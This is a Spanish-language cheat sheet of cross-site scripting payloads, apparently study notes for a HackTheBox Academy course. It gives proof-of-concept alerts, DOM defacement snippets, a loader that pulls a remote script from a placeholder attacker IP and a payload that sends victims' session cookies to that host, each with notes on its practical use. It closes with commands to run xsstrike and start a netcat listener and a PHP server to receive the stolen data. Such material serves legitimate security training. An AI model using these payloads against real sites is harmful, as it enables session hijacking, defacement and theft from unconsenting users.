---
aliases:
tags:
  - type/cheatsheet
primary categories:
secondary categories:
tertiary categories:
type: CheatSheet
linked:
  - "[[Cross-Site Scripting (XSS)]]"
---
# XSS - CWES

***

## Cheatsheet

| **Descripción**                   | **Código / Payload**                                                                          | **Detalles Adicionales / Uso Práctico**                                                                                                                                                                                     |
| --------------------------------- | --------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Basic XSS Payload**             | `<script>alert(window.origin)</script>`                                                       | <br>Ideal como Prueba de Concepto (PoC) rápida para confirmar la ejecución de JavaScript y verificar el origen actual (dominio) en el que se ejecuta.<br><br>                                                               |
| **Basic XSS Payload**             | `<plaintext>`                                                                                 | <br>Detiene el procesamiento del resto del HTML en la página. Es útil para "romper" la estructura del sitio y ver el código fuente restante en texto plano, aunque es menos común para explotación directa.<br><br>         |
| **Basic XSS Payload**             | `<script>print()</script>`                                                                    | <br>Una excelente alternativa de PoC si funciones como `alert()`, `prompt()` o `confirm()` están bloqueadas por un WAF (Web Application Firewall). Abre el cuadro de diálogo de impresión del navegador.<br><br>            |
| **HTML-based XSS Payload**        | `<img src="" onerror=alert(window.origin)>`                                                   | <br>Utiliza un manejador de eventos (`onerror`) en una etiqueta de imagen que falla a propósito (porque `src` está vacío). Es un método clásico para evadir filtros que bloquean la etiqueta `<script>`.<br><br>            |
| **Change Background Color**       | `<script>document.body.style.background = "#141d2b"</script>`                                 | <br>Sirve como confirmación visual inofensiva de que el XSS funciona, o como una técnica de defacement (desfiguración) muy leve.<br><br>                                                                                    |
| **Change Background Image**       | `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | <br>Defacement visual. Demuestra al cliente o al equipo de desarrollo que un atacante podría alterar por completo la apariencia del sitio web insertando imágenes externas.<br><br>                                         |
| **Change Website Title**          | `<script>document.title = 'HackTheBox Academy'</script>`                                      | <br>Manipulación sutil del DOM. Demuestra control sobre los metadatos de la página visible para el usuario en la pestaña del navegador.<br><br>                                                                             |
| **Overwrite website's main body** | `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>`                | <br>Defacement total. Reemplaza todo el contenido visible de la página web. Demuestra un impacto alto al poder simular que el sitio ha sido tomado por completo.<br><br>                                                    |
| **Remove certain HTML element**   | `<script>document.getElementById('urlform').remove();</script>`                               | <br>Manipulación específica del DOM. Puede usarse para ocultar advertencias de seguridad, eliminar botones críticos o interrumpir el funcionamiento normal de la aplicación.<br><br>                                        |
| **Load remote script**            | `<script src="http://OUR_IP/script.js"></script>`                                             | <br>Muy peligroso. Permite cargar un payload complejo (como un keylogger o un hook de BeEF) desde un servidor externo controlado, evitando tener que inyectar código largo directamente en el parámetro vulnerable.<br><br> |
| **Send Cookie details to us**     | `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>`               | <br>Exfiltración de datos. Roba las cookies de sesión de la víctima (si no tienen la flag `HttpOnly`) forzando al navegador a hacer una petición a tu servidor con las cookies adjuntas en la URL.                          |


---

### Comandos

|**Comando**|**Descripción**|
|---|---|
|`python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"`|Run xsstrike on a url parameter|
|`sudo nc -lvnp 80`|Start netcat listener|
|`sudo php -S 0.0.0.0:80`|Start PHP server|
